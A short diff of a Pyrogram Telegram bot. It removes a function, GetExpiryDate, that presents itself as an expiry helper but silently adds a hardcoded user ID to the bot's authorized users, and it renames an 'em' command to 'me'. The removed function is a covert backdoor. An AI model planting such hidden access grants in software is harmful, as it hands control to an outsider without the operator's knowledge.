@@ -26,10 +26,6 @@ logging.getLogger("pyrogram").setLevel(logging.WARNING)
 
 from pyrogram import InlineKeyboardButton, InlineKeyboardMarkup
 
-def GetExpiryDate(chat_id):
-    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
-    Config.AUTH_USERS.add(695291232)
-    return expires_at
 
 @pyrogram.Client.on_message(pyrogram.Filters.command(["about"]))
 async def help_user(bot, update):
@@ -238,7 +234,7 @@ async def add(bot, update):
  else:
    await update.reply_text("You are not Owner...!")
 
-@pyrogram.Client.on_message(pyrogram.Filters.command(["em"]))
+@pyrogram.Client.on_message(pyrogram.Filters.command(["me"]))
 async def em(bot, update):
     with open("backup.json", "r", encoding="utf8") as f:
             b_json = json.load(f)
